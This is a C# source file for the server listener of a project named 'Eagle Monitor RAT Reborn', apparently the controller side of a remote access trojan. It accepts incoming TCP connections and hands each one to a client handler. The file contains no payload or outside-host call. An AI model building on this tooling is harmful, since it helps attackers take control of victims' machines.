using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.Network
{
    internal class ServerHandler : IDisposable
    {
        internal readonly static List<ServerHandler> Servers;
        internal static int CurrentServersNumber { get { return Servers.Count; } }
        internal static bool stopServer { get; set; }

        static ServerHandler()
        {
            stopServer = false;
            Servers = new List<ServerHandler>();
        }

        private int serverPort { get; set; }
        internal Socket socket;

        private delegate ClientHandler AcceptClient();
        private readonly AcceptClient acceptClient;

        internal ServerHandler() : base()
        {
            Servers.Add(this);
            acceptClient = new AcceptClient(BeginClientAccepted);
        }

        internal bool Listen(int port)
        {
            serverPort = port;
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Any, port);
            socket = new Socket(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                socket.Bind(endPoint);
                socket.Listen(int.MaxValue);
                AcceptClientAsync();
                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
                return false;
            }
        }

        internal void AcceptClientAsync()
        {
            acceptClient.BeginInvoke(new AsyncCallback(EndAcceptedClient), null);
        }

        private ClientHandler BeginClientAccepted()
        {
            if(!stopServer)
                return new ClientHandler(socket.Accept(), this.serverPort);
            else
                return null;
        }

        private void EndAcceptedClient(IAsyncResult ar)
        {
            try
            {
                acceptClient.EndInvoke(ar);

                if (!stopServer)
                    AcceptClientAsync();
            }
            catch  { this.Dispose(); }
        }

        public void Dispose() 
        {
            socket.Close();
            if (socket != null)
                socket.Dispose();
        }
    }
}
